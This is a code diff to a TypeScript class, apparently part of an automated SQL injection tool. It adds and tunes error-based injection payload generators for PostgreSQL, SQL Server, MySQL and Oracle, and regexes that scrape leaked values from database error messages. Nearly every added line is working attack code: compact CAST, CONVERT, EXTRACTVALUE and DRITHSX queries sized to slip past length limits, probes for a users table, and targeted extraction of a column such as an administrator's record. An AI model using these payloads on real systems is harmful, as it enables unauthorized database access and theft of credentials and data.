@@ -809,11 +809,11 @@ export class MetadataExtractor {
   public static extractErrorBasedData(responseBody: string): string | undefined {
     if (!responseBody) return undefined;
 
-    // 1. PostgreSQL CAST syntax error
+    // 1. PostgreSQL CAST syntax error (including unescaped and HTML-encoded variants)
     // e.g. ERROR: invalid input syntax for type integer: "administrator"
-    const pgMatch = responseBody.match(/ERROR:\s*invalid input syntax for (?:type\s+)?(?:integer|numeric|int|smallint|bigint|boolean):\s*["']([^"'\r\n<]+)["']/i) ||
-                    responseBody.match(/invalid input syntax for (?:type\s+)?integer:\s*&quot;([^&]+)&quot;/i) ||
-                    responseBody.match(/invalid input syntax for (?:type\s+)?integer:\s*&#34;([^&]+)&#34;/i);
+    const pgMatch = responseBody.match(/(?:ERROR:\s*)?invalid input syntax for (?:type\s+)?(?:integer|numeric|int|smallint|bigint|boolean|uuid|date|timestamp):\s*["']([^"'\r\n<]+)["']/i) ||
+                    responseBody.match(/invalid input syntax for (?:type\s+)?(?:integer|int|numeric):\s*(?:&quot;|&#34;)([^&]+)(?:&quot;|&#34;)/i) ||
+                    responseBody.match(/invalid input syntax for (?:type\s+)?(?:integer|int|numeric):\s*&#39;([^&]+)&#39;/i);
     if (pgMatch && pgMatch[1]) {
       const val = MetadataExtractor.decodeHtmlEntities(pgMatch[1]).trim();
       if (val && !val.toLowerCase().includes('select') && !val.includes('CAST(')) {
@@ -823,8 +823,8 @@ export class MetadataExtractor {
 
     // 2. Microsoft SQL Server conversion error
     // e.g. Conversion failed when converting the varchar value 'administrator' to data type int.
-    const mssqlMatch = responseBody.match(/Conversion failed when converting the (?:varchar|nvarchar) value\s+['"]([^'"\r\n<]+)['"]\s+to data type/i) ||
-                       responseBody.match(/converting the (?:varchar|nvarchar) value\s+&#39;([^&]+)&#39;\s+to/i);
+    const mssqlMatch = responseBody.match(/Conversion failed when converting the (?:varchar|nvarchar|char|nchar) value\s+['"]([^'"\r\n<]+)['"]\s+to data type/i) ||
+                       responseBody.match(/converting the (?:varchar|nvarchar) value\s+(?:&quot;|&#39;|&#34;)([^&]+)(?:&quot;|&#39;|&#34;)\s+to/i);
     if (mssqlMatch && mssqlMatch[1]) {
       const val = MetadataExtractor.decodeHtmlEntities(mssqlMatch[1]).trim();
       if (val) return val;
@@ -839,8 +839,9 @@ export class MetadataExtractor {
       if (val) return val;
     }
 
-    // 4. Oracle DRITHSX / utl_inaddr / XMLType error
-    const oraMatch = responseBody.match(/ORA-01722:\s*invalid number\s*-\s*["']?([^"'\r\n<]+)["']?/i) ||
+    // 4. Oracle DRITHSX / utl_inaddr / XMLType / invalid number error
+    const oraMatch = responseBody.match(/ORA-20000:\s*Oracle Text error:.*?['"]([^'"\r\n<]+)['"]/i) ||
+                     responseBody.match(/ORA-01722:\s*invalid number(?:\s*-\s*["']?([^"'\r\n<]+)["']?)?/i) ||
                      responseBody.match(/ORA-29257:\s*host\s+([^"'\r\n<]+)\s+unknown/i);
     if (oraMatch && oraMatch[1]) {
       const val = MetadataExtractor.decodeHtmlEntities(oraMatch[1]).trim();
@@ -851,7 +852,8 @@ export class MetadataExtractor {
   }
 
   /**
-   * Generates error-based CAST / CONVERT table discovery queries
+   * Generates error-based CAST / CONVERT table discovery queries.
+   * Includes ultra-compact queries (< 60-80 chars) to survive backend buffer and cookie length limits.
    */
   public static getErrorBasedTableQueries(
     _param: CandidateParameter,
@@ -863,22 +865,36 @@ export class MetadataExtractor {
     const queries: string[] = [];
 
     if (dbms === 'PostgreSQL' || dbms === 'Generic SQL' || dbms === 'Unknown') {
+      // 1. Ultra-compact queries (under 80 chars)
+      if (offset === 0) {
+        queries.push(`${p} AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--`);
+        // Direct probes for common high-value application tables
+        queries.push(`${p} AND 1=CAST((SELECT 1 FROM users LIMIT 1) AS int)--`);
+      }
+      queries.push(`${p} AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET ${offset}) AS int)--`);
+      // 2. Standard queries with schema filter
       queries.push(`${p} AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' OFFSET ${offset} LIMIT 1) AS int)--`);
-      queries.push(`${p} AND 1=CAST((SELECT table_name FROM information_schema.tables OFFSET ${offset} LIMIT 1) AS int)--`);
       queries.push(`${p} AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' OFFSET ${offset} LIMIT 1) AS int) AND '1'='1`);
     }
 
     if (dbms === 'Microsoft SQL Server' || dbms === 'Generic SQL' || dbms === 'Unknown') {
       queries.push(`${p} AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM (SELECT TOP ${offset + 1} table_name FROM information_schema.tables ORDER BY table_name ASC) t ORDER BY table_name DESC))--`);
+      if (offset === 0) {
+        queries.push(`${p} AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--`);
+        queries.push(`${p} AND 1=CONVERT(int, (SELECT TOP 1 name FROM sys.tables))--`);
+      }
     }
 
     if (dbms === 'MySQL' || dbms === 'MariaDB' || dbms === 'Generic SQL' || dbms === 'Unknown') {
-      queries.push(`${p} AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT ${offset},1)))--`);
-      queries.push(`${p} AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables LIMIT ${offset},1)))--`);
+      queries.push(`${p} AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables LIMIT ${offset},1)))-- -`);
+      queries.push(`${p} AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT ${offset},1)))-- -`);
     }
 
     if (dbms === 'Oracle') {
       queries.push(`${p} AND 1=CTXSYS.DRITHSX.SN(1,(SELECT table_name FROM (SELECT table_name, ROWNUM r FROM user_tables) WHERE r=${offset + 1}))--`);
+      if (offset === 0) {
+        queries.push(`${p} AND 1=CTXSYS.DRITHSX.SN(1,(SELECT table_name FROM user_tables WHERE ROWNUM=1))--`);
+      }
     }
 
     return queries;
@@ -899,8 +915,10 @@ export class MetadataExtractor {
     const queries: string[] = [];
 
     if (dbms === 'PostgreSQL' || dbms === 'Generic SQL' || dbms === 'Unknown') {
+      // Ultra-compact column enumeration
+      queries.push(`${p} AND 1=CAST((SELECT column_name FROM information_schema.columns WHERE table_name='${cleanTable}' LIMIT 1 OFFSET ${offset}) AS int)--`);
+      queries.push(`${p} AND 1=CAST((SELECT column_name FROM information_schema.columns WHERE table_name='${cleanTable.toLowerCase()}' LIMIT 1 OFFSET ${offset}) AS int)--`);
       queries.push(`${p} AND 1=CAST((SELECT column_name FROM information_schema.columns WHERE table_name='${cleanTable}' OFFSET ${offset} LIMIT 1) AS int)--`);
-      queries.push(`${p} AND 1=CAST((SELECT column_name FROM information_schema.columns WHERE table_name='${cleanTable.toLowerCase()}' OFFSET ${offset} LIMIT 1) AS int)--`);
       queries.push(`${p} AND 1=CAST((SELECT column_name FROM information_schema.columns WHERE table_name='${cleanTable}' OFFSET ${offset} LIMIT 1) AS int) AND '1'='1`);
     }
 
@@ -909,7 +927,7 @@ export class MetadataExtractor {
     }
 
     if (dbms === 'MySQL' || dbms === 'MariaDB' || dbms === 'Generic SQL' || dbms === 'Unknown') {
-      queries.push(`${p} AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_name='${cleanTable}' LIMIT ${offset},1)))--`);
+      queries.push(`${p} AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_name='${cleanTable}' LIMIT ${offset},1)))-- -`);
     }
 
     if (dbms === 'Oracle') {
@@ -928,7 +946,8 @@ export class MetadataExtractor {
     columnName: string,
     offset: number,
     dbms: DbmsType,
-    clearPrefix: boolean = true
+    clearPrefix: boolean = true,
+    whereClause?: string
   ): string[] {
     const p = clearPrefix ? "'" : "original'";
     const cleanTable = MetadataExtractor.decodeHtmlEntities(tableName).replace(/['"]/g, '');
@@ -936,21 +955,35 @@ export class MetadataExtractor {
     const queries: string[] = [];
 
     if (dbms === 'PostgreSQL' || dbms === 'Generic SQL' || dbms === 'Unknown') {
-      queries.push(`${p} AND 1=CAST((SELECT ${cleanCol} FROM ${cleanTable} OFFSET ${offset} LIMIT 1) AS int)--`);
+      if (whereClause) {
+        // Ultra-compact targeted queries (e.g. username='administrator')
+        queries.push(`${p} AND 1=CAST((SELECT ${cleanCol} FROM ${cleanTable} WHERE ${whereClause} LIMIT 1) AS int)--`);
+        queries.push(`${p} AND 1=CAST((SELECT ${cleanCol}::text FROM ${cleanTable} WHERE ${whereClause} LIMIT 1) AS int)--`);
+      }
       queries.push(`${p} AND 1=CAST((SELECT ${cleanCol} FROM ${cleanTable} LIMIT 1 OFFSET ${offset}) AS int)--`);
+      queries.push(`${p} AND 1=CAST((SELECT ${cleanCol} FROM ${cleanTable} OFFSET ${offset} LIMIT 1) AS int)--`);
       queries.push(`${p} AND 1=CAST((SELECT ${cleanCol}::text FROM ${cleanTable} OFFSET ${offset} LIMIT 1) AS int)--`);
       queries.push(`${p} AND 1=CAST((SELECT ${cleanCol} FROM ${cleanTable} OFFSET ${offset} LIMIT 1) AS int) AND '1'='1`);
     }
 
     if (dbms === 'Microsoft SQL Server' || dbms === 'Generic SQL' || dbms === 'Unknown') {
+      if (whereClause) {
+        queries.push(`${p} AND 1=CONVERT(int, (SELECT TOP 1 ${cleanCol} FROM ${cleanTable} WHERE ${whereClause}))--`);
+      }
       queries.push(`${p} AND 1=CONVERT(int, (SELECT TOP 1 ${cleanCol} FROM (SELECT TOP ${offset + 1} ${cleanCol} FROM ${cleanTable} ORDER BY 1 ASC) t ORDER BY 1 DESC))--`);
     }
 
     if (dbms === 'MySQL' || dbms === 'MariaDB' || dbms === 'Generic SQL' || dbms === 'Unknown') {
-      queries.push(`${p} AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT ${cleanCol} FROM ${cleanTable} LIMIT ${offset},1)))--`);
+      if (whereClause) {
+        queries.push(`${p} AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT ${cleanCol} FROM ${cleanTable} WHERE ${whereClause} LIMIT 1)))-- -`);
+      }
+      queries.push(`${p} AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT ${cleanCol} FROM ${cleanTable} LIMIT ${offset},1)))-- -`);
     }
 
     if (dbms === 'Oracle') {
+      if (whereClause) {
+        queries.push(`${p} AND 1=CTXSYS.DRITHSX.SN(1,(SELECT ${cleanCol} FROM ${cleanTable} WHERE ${whereClause} AND ROWNUM=1))--`);
+      }
       queries.push(`${p} AND 1=CTXSYS.DRITHSX.SN(1,(SELECT ${cleanCol} FROM (SELECT ${cleanCol}, ROWNUM r FROM ${cleanTable}) WHERE r=${offset + 1}))--`);
     }
 
